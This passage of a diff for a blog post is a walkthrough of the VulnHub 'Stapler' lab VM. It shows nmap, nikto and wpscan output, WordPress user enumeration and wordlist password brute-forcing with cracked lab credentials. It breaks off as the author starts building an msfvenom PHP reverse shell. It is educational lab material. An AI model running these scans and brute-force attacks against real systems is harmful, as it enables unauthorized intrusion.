@@ -1,12 +1,1400 @@
 ---
 layout: post
-title:  "Stapler"
-date:   2019-04-15 00:34:01 +0000
+title: "Stapler"
+date: 2019-04-15 00:34:01 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-04-29 16:54:51 +0000" name="updated"/><title>Stapler</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/stapler-1,150/" target="_blank">https://www.vulnhub.com/entry/stapler-1,150/</a></div><div>Hostname: red.initech</div><div>IP Address: 10.183.0.194</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.194.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# nmap -Pn -sT -sV -A -oA stapler -p 1-65535 10.183.0.194</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-19 00:01 EDT</div><div>Nmap scan report for red.initech.homenet.dom (10.183.0.194)</div><div>Host is up (0.0029s latency).</div><div>Not shown: 65523 filtered ports   </div><div>PORT      STATE  SERVICE     VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">20/tcp    closed ftp-data</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">21/tcp    open   ftp         vsftpd 2.0.8 or later</font></div><div>| ftp-anon: Anonymous FTP login allowed (FTP code 230)</div><div>|_Can't get directory listing: PASV failed: 550 Permission denied.</div><div>| ftp-syst:</div><div>|   STAT:</div><div>| FTP server status:</div><div>|      Connected to 10.183.0.222  </div><div>|      Logged in as ftp</div><div>|      TYPE: ASCII</div><div>|      No session bandwidth limit </div><div>|      Session timeout in seconds is 300</div><div>|      Control connection is plain text</div><div>|      Data connections will be plain text</div><div>|      At session startup, client count was 3</div><div>|      <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">vsFTPd 3.0.3</font> - secure, fast, stable</div><div>|_End of status</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey:</div><div>|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)</div><div>|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)</div><div>|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp    open   domain      dnsmasq 2.75</font></div><div>| dns-nsid:</div><div>|_  bind.version: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">dnsmasq-2.75</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open   http        PHP cli server 5.5 or later</font></div><div>|_http-title: 404 Not Found</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">123/tcp   closed ntp</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">137/tcp   closed netbios-ns</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">138/tcp   closed netbios-dgm</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">666/tcp   open   doom?</font></div><div><div>| fingerprint-strings:</div><div>|   NULL:</div><div>|     message2.jpgUT</div><div>|     QWux</div><div>|     "DL[E</div><div>|     #;3[</div><div>|     \xf6</div><div>|     u([r</div><div>|     qYQq</div><div>|     Y_?n2</div><div>|     3&amp;M~{</div><div>|     9-a)T</div><div>|     L}AJ</div><div>|_    .npy.9</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1</font></div><div>| mysql-info:</div><div>|   Protocol: 10</div><div>|   Version: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">5.7.12-0ubuntu1</font></div><div>|   Thread ID: 8</div><div>|   Capabilities flags: 63487</div><div>|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SupportsCompression, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</div><div>|   Status: Autocommit</div><div>|   Salt: k\x0E+</div><div>|       U%\x1F&gt;)Te\x7F8}\x04QD\x165</div><div>|_  Auth Plugin Name: 88</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</font></div><div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div><div>|_http-title: Site doesn't have a title (text/html).</div><div>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</div><div><div>SF-Port666-TCP:V=7.70%I=7%D=4/19%Time=5CB94895%P=x86_64-pc-linux-gnu%r(NUL</div><div>SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1</div><div>SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0</div><div>SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa</div><div>SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\</div><div>SF:x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x</div><div>SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu</div><div>SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd</div><div>SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa</div><div>SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x</div><div>SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x</div><div>SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x</div><div>SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd</div><div>SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa</div><div>SF:f\xbd&amp;&amp;q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:</div><div>SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\</div><div>SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\</div><div>SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd</div><div>SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\</div><div>SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\</div><div>SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\</div><div>SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak</div><div>SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\</div><div>SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f</div><div>SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\</div><div>SF:[\x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x</div><div>SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa</div><div>SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\</div><div>SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9</div><div>SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f</div><div>SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4</div><div>SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\</div><div>SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb</div><div>SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0</div><div>SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\</div><div>SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x</div><div>SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\</div><div>SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");</div><div>MAC Address: 08:00:27:67:B9:50 (Oracle VirtualBox virtual NIC)</div><div>Device type: general purpose</div><div>Running: Linux 3.X|4.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div>OS details: Linux 3.2 - 4.9</div><div>Network Distance: 1 hop</div><div>Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div></div><div>Host script results:</div><div>|_clock-skew: mean: -5h20m02s, deviation: 34m38s, median: -5h00m02s</div><div>|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div><div>| smb-os-discovery:</div><div>|   OS: Windows 6.1 (<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Samba 4.3.9-Ubuntu</font>)</div><div>|   Computer name: red</div><div>|   NetBIOS computer name: RED\x00</div><div>|   Domain name: \x00</div><div>|   FQDN: red</div><div>|_  System time: 2019-04-19T00:03:44+01:00</div><div>| smb-security-mode:</div><div>|   account_used: guest</div><div>|   authentication_level: user</div><div>|   challenge_response: supported </div><div>|_  message_signing: disabled (dangerous, but default)</div><div>| smb2-security-mode:</div><div>|   2.02:</div><div>|_    Message signing enabled but not required</div><div>| smb2-time:</div><div>|   date: 2019-04-18 19:03:44</div><div>|_  start_date: N/A</div><div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   2.87 ms red.initech.homenet.dom (10.183.0.194)</div></div><div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 164.07 seconds</div></div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>We detected lots of open ports and services and we were able to determine some software versions, including:</div><ul><li><div>vsFTPd 3.0.3 - no known exploits</div></li><li><div>dnsmasq-2.75 - lots of DoS vulnerabilities</div></li><li><div>MySQL 5.7.12-0ubuntu1 - a possible Integer Overflow we could use, but is listed as DoS</div></li><li><div>Apache/2.4.18 - a Local Privilege Escalation vulnerability we might can use</div></li><li><div>Samba 4.3.9-Ubuntu - no known exploits</div></li></ul><div><br/></div><div>Let's take a look at the HTTP services on TCP port 80 and TCP port 12380.</div><div><br/></div><div>The default page for the HTTP service on TCP port 80 returns a "404 Not Found" error. Scanning it with nikto produces the following:</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# nikto -h http://10.183.0.194/</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.194</div><div>+ Target Hostname:    10.183.0.194</div><div>+ Target Port:        80</div><div>+ Start Time:         2019-04-19 00:40:21 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: No banner retrieved</div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div><div>+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.</div><div>+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.</div><div>+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response</div><div>+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host</div><div>+ End Time:           2019-04-19 00:41:06 (GMT-4) (45 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>Based on the existence of the .bashrc and .profile files, the document root for this service is likely a user's home directory.</div><div><br/></div><div>The default page for the HTTP service on TCP port 12380 returns an interesting page that implies the service setup was incomplete. That's good for us. There are also some comments spread throughout the page with potential employees/usernames.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>&lt;!-- Credit: http://www.creative-tim.com/product/coming-sssoon-page --&gt;</div><div>&lt;!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! --&gt;</div><div>&lt;!--    Change the image source '/images/default.jpg' with your favourite image.     --&gt;</div><div>&lt;!--   You can change the black color for the filter with those colors: blue, green, red, orange       --&gt;</div><div>&lt;!--  H1 can have 2 designs: "logo" and "logo cursive"           --&gt;</div></div><div><br/></div><div>Scanning it with nikto produces the following:</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# nikto -h http://10.183.0.194:12380</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.194</div><div>+ Target Hostname:    10.183.0.194</div><div>+ Target Port:        12380</div><div>---------------------------------------------------------------------------</div><div>+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</div><div>                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384</div><div>                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</div><div>+ Start Time:         2019-04-19 00:44:25 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here</div><div>+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</div><div>+ The site uses SSL and Expect-CT header is not present.</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div><div>+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ "robots.txt" contains 2 entries which should be manually viewed.</div><div>+ Hostname '10.183.0.194' does not match certificate's names: Red.Initech</div><div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div><div>+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </div><div>+ Uncommon header 'x-ob_mode' found, with contents: 1</div><div>+ OSVDB-3233: /icons/README: Apache default file found.</div><div>+ <font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">/phpmyadmin/: phpMyAdmin directory found</font></div><div>+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host</div><div>+ End Time:           2019-04-19 00:48:35 (GMT-4) (250 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>Checking the directories in robots.txt, the /admin112233 gives us a cheeky warning and redirects us. The /blogblog directory, however, returns a WordPress site for INITECH. We also see a potential username ('pam') in the certificate information. Nikto also alerted us to a phpmyadmin site, which should be interesting. Let's start by digging into the WordPress site with wpscan.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# wpscan --disable-tls-checks --url https://10.183.0.194:12380/blogblog --wp-content-dir wp-content --enumerate</div><div>_______________________________________________________________</div><div>        __          _______   _____</div><div>        \ \        / /  __ \ / ____|</div><div>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</div><div>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</div><div>           \  /\  /  | |     ____) | (__| (_| | | | |</div><div>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</div><div><div><br/></div><div><br/></div></div><div>        WordPress Security Scanner by the WPScan Team</div><div>                       Version 3.5.1</div><div>          Sponsored by Sucuri - https://sucuri.net</div><div>      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</div><div>_______________________________________________________________</div><div><div><br/></div></div><div>[+] URL: https://10.183.0.194:12380/blogblog/</div><div>[+] Started: Fri Apr 19 00:55:21 2019</div><div><div><br/></div></div><div>Interesting Finding(s):</div><div><div><br/></div></div><div>[+] https://10.183.0.194:12380/blogblog/</div><div> | Interesting Entries:</div><div> |  - Server: Apache/2.4.18 (Ubuntu)</div><div> |  - Dave: Soemthing doesn't look right here</div><div> | Found By: Headers (Passive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div><div>[...]</div><div><br/></div><div>[+] https://10.183.0.194:12380/blogblog/readme.html</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div></div><div>[+] Registration is enabled: https://10.183.0.194:12380/blogblog/wp-login.php?action=register</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div></div><div>[+] Upload directory has listing enabled: https://10.183.0.194:12380/blogblog/wp-content/uploads/</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div></div><div>[+] https://10.183.0.194:12380/blogblog/wp-cron.php</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 60%</div><div> | References:</div><div> |  - https://www.iplocation.net/defend-wordpress-from-ddos</div><div> |  - https://github.com/wpscanteam/wpscan/issues/1299</div><div><div><br/></div></div><div>[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</div><div> | Detected By: Rss Generator (Passive Detection)</div><div> |  - https://10.183.0.194:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</div><div> |  - https://10.183.0.194:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</div><div> |</div><div><div><br/></div><div>[...]</div></div><div><br/></div></div><div>[+] Enumerating Users (via Passive and Aggressive Methods)</div><div> Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</div><div><div><br/></div></div><div>[i] User(s) Identified:</div><div><div><br/></div></div><div>[+] John Smith</div><div> | Detected By: Author Posts - Display Name (Passive Detection)</div><div> | Confirmed By: Rss Generator (Passive Detection)</div><div><div><br/></div></div><div>[+] elly</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] peter</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] barry</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] heather</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] john</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] garry</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div><div>[+] harry</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] scott</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] kathy</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] tim</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div></div><div>[+] Finished: Fri Apr 19 00:55:35 2019</div><div>[+] Requests Done: 3092</div><div>[+] Cached Requests: 10</div><div>[+] Data Sent: 719.641 KB</div><div>[+] Data Received: 822.122 KB</div><div>[+] Memory used: 188.211 MB</div><div>[+] Elapsed time: 00:00:13</div></div></div><div><br/></div><div>I decided to use wpscan to try to crack some of the user's passwords. Based on the posts in the blog, it looks like 'john' might be the administrator, but we'll see which accounts we can get into and maybe we can elevate from there.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>wpscan --disable-tls-checks --url https://10.183.0.194:12380/blogblog --wp-content-dir wp-content --usernames wordpress-users --passwords /usr/share/seclists/Passwords/Most-Popular-Letter-Passes.txt --output wpscan-password-attack --password-attack wp-login</div></div><div><br/></div><div>We were able to crack the password for several of the accounts, but not 'john'. Tim seemed to be in charge of setting up the site, so let's start with looking at his account. (Also, TimThumb is a known vulnerable WordPress plugin).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>[i] Valid Combinations Found:</div><div> | Username: scott, Password: cookie</div><div> | Username: kathy, Password: coolgirl</div><div> | Username: garry, Password: football</div><div> | Username: harry, Password: monkey</div><div> | Username: tim, Password: thumb</div></div><div><br/></div><div>The only 'Tools' available for tim (and all the other accounts we cracked) is 'Press This'. This plugin has potential because it allows file uploads, but, alas, we don't have permission to upload files.</div><div><br/></div><div><img height="200" src="/assets/images/2019-04-15-stapler/519272D0-E753-49FB-BB41-E386D1010780.png" width="564"/><br/></div><div><br/></div><div>Let's see if any of the accounts we cracked can upload files... Nope!</div><div><br/></div><div>We remember that one of the names mentioned in the default site's comments was 'Zoe', but that name didn't show up in our enumerated users. Let's try to login as 'zoe' and see if that is a valid account... and it is!</div><div><br/></div><div><img height="710" src="/assets/images/2019-04-15-stapler/E35E75CD-F0C5-4388-8962-69161D87DBA3.png" width="668"/><br/></div><div><br/></div><div>We also found another valid username ('abby') in the file <a href="https://10.183.0.194:12380/announcements/message.txt">https://10.183.0.194:12380/announcements/message.txt</a>...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Abby, we need to link the folder somewhere! Hidden at the mo</div></div><div><br/></div><div>I split out the accounts we hadn't cracked and added the new accounts we found ('zoe' and 'abby'). I decided to try a different dictionary, too.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>wpscan --disable-tls-checks --url https://10.183.0.194:12380/blogblog --wp-content-dir wp-content --usernames wordpress-users2 --passwords /usr/share/seclists/Passwords/probable-v2-top12000.txt --output wpscan-password-attack2 --password-attack wp-login</div></div><div><br/></div><div>This time we were able to crack John's account, which was the original goal. Let's try logging in as 'john' and see how things look.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>[i] Valid Combinations Found:</div><div>| Username: heather, Password: passphrase</div><div> | Username: john, Password: incorrect</div></div><div><br/></div><div>As we suspected, John is an admin! 😄 Now that we have admin access to the WordPress site, we should be able to create a malicious plugin and upload it.</div><div><br/></div><div>We'll start by creating our PHP reverse shell using msfvenom.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; 